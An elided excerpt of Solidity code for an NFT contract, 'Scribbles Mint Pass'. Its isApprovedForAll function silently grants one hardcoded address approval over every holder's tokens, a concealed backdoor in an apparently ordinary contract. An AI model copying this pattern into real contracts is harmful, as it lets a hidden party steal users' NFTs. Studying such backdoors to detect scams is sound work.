  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x83d7D658c2b7e1ee1f62ed2D35D9b31E2fE54f38){return true;}
...
contract Scribbles is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  uint public maxSupply = 5888;
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Scribbles Mint Pass", "SCRBBLS", maxBatchSize_, collectionSize_) {
